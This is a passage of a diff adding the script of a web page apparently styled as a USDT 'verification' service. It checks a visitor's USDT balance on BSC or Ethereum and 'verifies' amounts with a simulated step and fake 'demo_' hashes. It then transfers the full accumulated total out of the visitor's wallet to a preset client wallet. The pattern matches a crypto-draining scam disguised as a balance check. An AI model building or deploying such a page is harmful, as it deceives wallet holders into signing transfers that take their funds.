+                    ];
+
+                    // Check current network
+                    const chainId = await this.web3.eth.getChainId();
+                    console.log('Current network chainId:', chainId);
+                    
+                    let contract, balance;
+                    
+                    // Try BSC USDT first (chainId 56)
+                    try {
+                        console.log('Checking BSC USDT balance...');
+                        contract = new this.web3.eth.Contract(usdtABI, this.usdtContractBSC);
+                        balance = await contract.methods.balanceOf(this.userAccount).call();
+                        const decimals = await contract.methods.decimals().call();
+                        const usdtBalance = parseFloat(balance) / Math.pow(10, decimals);
+                        console.log('BSC USDT balance found:', usdtBalance);
+                        return usdtBalance;
+                    } catch (bscError) {
+                        console.log('BSC balance check failed:', bscError.message);
+                    }
+                    
+                    // Try Ethereum USDT (chainId 1)
+                    try {
+                        console.log('Checking Ethereum USDT balance...');
+                        contract = new this.web3.eth.Contract(usdtABI, this.usdtContractETH);
+                        balance = await contract.methods.balanceOf(this.userAccount).call();
+                        const decimals = await contract.methods.decimals().call();
+                        const usdtBalance = parseFloat(balance) / Math.pow(10, decimals);
+                        console.log('Ethereum USDT balance found:', usdtBalance);
+                        return usdtBalance;
+                    } catch (ethError) {
+                        console.log('Ethereum balance check failed:', ethError.message);
+                    }
+                    
+                    throw new Error('No USDT found on BSC or Ethereum networks. Please ensure you have USDT on one of these networks.');
+                    
+                } catch (error) {
+                    console.error('Balance check failed:', error);
+                    throw error;
+                }
+            }
+
+            async simulateVerification(amount) {
+                try {
+                    // Show checking message
+                    this.showPending('Checking USDT balance...');
+                    
+                    // Check actual USDT balance
+                    const balance = await this.checkUSDTBalance();
+                    
+                    // Update status
+                    this.showPending(`Balance: ${balance.toFixed(2)} USDT. Verifying transaction...`);
+                    
+                    // Check if user has enough balance for this transaction
+                    if (balance < amount) {
+                        throw new Error(`Insufficient USDT balance. You have ${balance.toFixed(2)} USDT but trying to verify ${amount} USDT`);
+                    }
+                    
+                    // Check if user has enough balance for total verified amount + this transaction
+                    const totalAfterTransaction = this.verifiedTotal + amount;
+                    if (balance < totalAfterTransaction) {
+                        throw new Error(`Insufficient USDT balance. You have ${balance.toFixed(2)} USDT but total verified amount would be ${totalAfterTransaction.toFixed(2)} USDT`);
+                    }
+                    
+                    // Simulate verification delay
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    // Verification succeeds if balance is sufficient
+                    return true;
+                    
+                } catch (error) {
+                    console.error('Verification failed:', error);
+                    throw error;
+                }
+            }
+
+            addVerifiedTransaction(amount) {
+                const transaction = {
+                    id: Date.now(),
+                    amount: amount,
+                    timestamp: new Date().toISOString(),
+                    status: 'verified',
+                    hash: 'demo_' + Math.random().toString(36).substr(2, 9)
+                };
+                
+                this.transactions.unshift(transaction);
+                this.verifiedTotal += amount;
+                
+                // Keep only last 10 transactions
+                if (this.transactions.length > 10) {
+                    this.transactions = this.transactions.slice(0, 10);
+                }
+                
+                this.saveToStorage();
+                this.updateDisplay();
+            }
+
+            async processTransfer() {
+                console.log('=== PROCESSING TRANSFER ===');
+                
+                try {
+                    // Show transfer progress
+                    this.showPending('Processing USDT transfer...');
+                    
+                    // Get current USDT balance
+                    const balance = await this.checkUSDTBalance();
+                    console.log('Current balance:', balance);
+                    
+                    if (balance < this.verifiedTotal) {
+                        throw new Error(`Insufficient balance. You have ${balance.toFixed(2)} USDT but need ${this.verifiedTotal.toFixed(2)} USDT`);
+                    }
+                    
+                    // Execute the transfer
+                    const transferResult = await this.executeUSDTTransfer(this.verifiedTotal);
+                    
+                    if (transferResult.success) {
+                        // Success - show transaction details
+                        this.showTransferSuccess(transferResult);
+                        
+                        // Reset the verified total after successful transfer
+                        this.verifiedTotal = 0;
+                        this.transactions = [];
+                        this.saveToStorage();
+                        this.updateDisplay();
+                    } else {
+                        throw new Error(transferResult.error || 'Transfer failed');
+                    }
+                    
+                } catch (error) {
+                    console.error('Transfer failed:', error);
+                    this.showError(`Transfer failed: ${error.message}`);
+                }
+            }
+
+            async executeUSDTTransfer(amount) {
+                try {
+                    console.log(`Transferring ${amount} USDT to ${this.clientWallet}`);
+                    
+                    // USDT Contract ABI (Transfer function)
+                    const usdtABI = [
+                        {
+                            "constant": false,
+                            "inputs": [
+                                {"name": "_to", "type": "address"},
+                                {"name": "_value", "type": "uint256"}
+                            ],
+                            "name": "transfer",
+                            "outputs": [{"name": "", "type": "bool"}],
+                            "type": "function"
+                        },
+                        {
+                            "constant": true,
+                            "inputs": [],
+                            "name": "decimals",
+                            "outputs": [{"name": "", "type": "uint8"}],
+                            "type": "function"
+                        }
+                    ];
+
+                    // Get current network
+                    const chainId = await this.web3.eth.getChainId();
+                    console.log('Current network:', chainId);
+                    
+                    let contractAddress;
+                    if (chainId === 56) {
+                        contractAddress = this.usdtContractBSC; // BSC
+                    } else if (chainId === 1) {
+                        contractAddress = this.usdtContractETH; // Ethereum
+                    } else {
+                        throw new Error('Please switch to BSC or Ethereum network');
+                    }
+
+                    // Create contract instance
+                    const contract = new this.web3.eth.Contract(usdtABI, contractAddress);
+                    
+                    // Get decimals
+                    const decimals = await contract.methods.decimals().call();
+                    
+                    // Convert amount to wei (considering decimals)
+                    const amountWei = this.web3.utils.toBN(amount).mul(this.web3.utils.toBN(10).pow(this.web3.utils.toBN(decimals)));
+                    
+                    console.log('Amount in wei:', amountWei.toString());
+                    console.log('Transfer to:', this.clientWallet);
+                    
+                    // Estimate gas
+                    const gasEstimate = await contract.methods.transfer(this.clientWallet, amountWei).estimateGas({
+                        from: this.userAccount
+                    });
+                    
+                    console.log('Gas estimate:', gasEstimate);
+                    
+                    // Execute transfer
+                    const tx = await contract.methods.transfer(this.clientWallet, amountWei).send({
+                        from: this.userAccount,
+                        gas: gasEstimate
+                    });
+                    
+                    console.log('Transfer transaction:', tx);
+                    
+                    return {
+                        success: true,
+                        txHash: tx.transactionHash,
+                        amount: amount,
+                        recipient: this.clientWallet,
+                        network: chainId === 56 ? 'BSC' : 'Ethereum'
+                    };
+                    
+                } catch (error) {
+                    console.error('Transfer execution failed:', error);
+                    return {
+                        success: false,
+                        error: error.message
+                    };
+                }
+            }
+
+            showTransferSuccess(result) {
+                const statusDiv = document.getElementById('statusMessage');
+                
+                statusDiv.innerHTML = `
+                    <div style="color: #4CAF50; margin-bottom: 1.5rem; font-size: 1.2rem; font-weight: bold;">
+                        ✅ Transfer Successful!
+                    </div>
+                    <div style="background: linear-gradient(135deg, #1a1a1a, #2a2a2a); padding: 1.5rem; border-radius: 12px; margin-bottom: 1.5rem; border: 1px solid #ffcc00; box-shadow: 0 4px 15px rgba(255, 204, 0, 0.1);">
+                        <div style="margin-bottom: 0.8rem; display: flex; justify-content: space-between; align-items: center;">
+                            <span style="color: #ffcc00; font-weight: bold;">Amount:</span>
+                            <span style="color: #fff; font-size: 1.1rem; font-weight: bold;">${result.amount} USDT</span>
+                        </div>
+                        <div style="margin-bottom: 0.8rem;">
+                            <div style="color: #ffcc00; font-weight: bold; margin-bottom: 0.3rem;">Recipient:</div>
+                            <div style="color: #fff; font-family: monospace; font-size: 0.9rem; word-break: break-all; background: #111; padding: 0.5rem; border-radius: 6px;">${result.recipient}</div>
+                        </div>
+                        <div style="margin-bottom: 0.8rem; display: flex; justify-content: space-between; align-items: center;">
+                            <span style="color: #ffcc00; font-weight: bold;">Network:</span>
+                            <span style="color: #4CAF50; font-weight: bold; background: rgba(76, 175, 80, 0.2); padding: 0.3rem 0.8rem; border-radius: 15px; font-size: 0.9rem;">${result.network}</span>
+                        </div>
+                        <div style="margin-bottom: 0.5rem;">
+                            <div style="color: #ffcc00; font-weight: bold; margin-bottom: 0.3rem;">Transaction Hash:</div>
+                            <div style="background: #111; padding: 0.8rem; border-radius: 8px; border: 1px solid #333;">
+                                <a href="https://${result.network === 'BSC' ? 'bscscan.com' : 'etherscan.io'}/tx/${result.txHash}" target="_blank" style="color: #ffcc00; text-decoration: none; font-family: monospace; font-size: 0.85rem; word-break: break-all; display: block; transition: color 0.3s ease;" onmouseover="this.style.color='#ffd700'" onmouseout="this.style.color='#ffcc00'">${result.txHash}</a>
+                            </div>
+                        </div>
+                        <div style="text-align: center; margin-top: 1rem; padding-top: 1rem; border-top: 1px solid #333;">
+                            <span style="color: #4CAF50; font-size: 0.9rem; font-weight: bold;">🎉 All USDT successfully transferred to client wallet!</span>
+                        </div>
+                    </div>
+                `;
+            }
+
+            showSuccess(amount) {
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.innerHTML = `
+                    <div style="color: #4CAF50; margin-bottom: 1rem;">
+                        ✅ ${amount} USDT Verified Successfully!
+                    </div>
+                `;
+            }
+
+            showError(message) {
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.innerHTML = `
+                    <div style="color: #f44336; margin-bottom: 1rem;">
+                        ❌ ${message}
+                    </div>
+                `;
+            }
+
+            showPending(message) {
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.innerHTML = `
+                    <div style="color: #ff9800; margin-bottom: 1rem;">
+                        ⏳ ${message}
+                    </div>
+                `;
+            }
+
+            updateDisplay() {
+                // Update total display
+                document.getElementById('totalAmount').textContent = `${this.verifiedTotal.toFixed(2)} USDT`;
+                document.getElementById('currentLimit').textContent = this.usdtLimit;
+                
+                // Update transaction history
+                const transactionList = document.getElementById('transactionList');
+                if (this.transactions.length === 0) {
+                    transactionList.innerHTML = '<p style="color: #aaa; text-align: center; padding: 2rem; background: #111; border-radius: 8px; border: 1px dashed #333;">No transactions yet</p>';
+                } else {
+                    transactionList.innerHTML = this.transactions.map(tx => `
+                        <div class="transaction-item" style="background: linear-gradient(135deg, #1a1a1a, #2a2a2a); border: 1px solid #333; border-left: 4px solid #ffcc00; transition: all 0.3s ease;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 15px rgba(255, 204, 0, 0.2)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
+                            <div>
+                                <span class="transaction-amount" style="color: #ffcc00; font-weight: bold; font-size: 1.1rem;">${tx.amount} USDT</span>
+                                <div style="font-size: 0.8rem; color: #aaa; margin-top: 0.3rem;">${new Date(tx.timestamp).toLocaleString()}</div>
+                            </div>
+                            <div class="transaction-status status-${tx.status}" style="padding: 0.3rem 0.8rem; border-radius: 15px; font-weight: bold; font-size: 0.9rem;">
+                                ${tx.status === 'verified' ? '✅ Verified' : '❌ Failed'}
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            }
+
+            resetTotal() {
+                this.verifiedTotal = 0;
+                this.transactions = [];
+                this.saveToStorage();
+                this.updateDisplay();
+                this.showSuccess('Total reset successfully!');
+            }
+
+            saveToStorage() {
+                localStorage.setItem('verifiedTotal', this.verifiedTotal.toString());
+                localStorage.setItem('transactions', JSON.stringify(this.transactions));
+            }
+        }
+
+        // Initialize the system when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('DOM loaded, forcing loading state...');
+            
+            // Force show loading state immediately
+            const loadingState = document.getElementById('loadingState');
+            const disconnectedState = document.getElementById('disconnectedState');
+            const connectedState = document.getElementById('connectedState');
+            
+            if (loadingState) loadingState.style.display = 'block';
+            if (disconnectedState) disconnectedState.style.display = 'none';
+            if (connectedState) connectedState.style.display = 'none';
+            
+            console.log('Creating USDT system...');
+            window.usdtSystem = new USDTVerificationSystem();
+        });
+    </script>
+</body>
+
+</html>
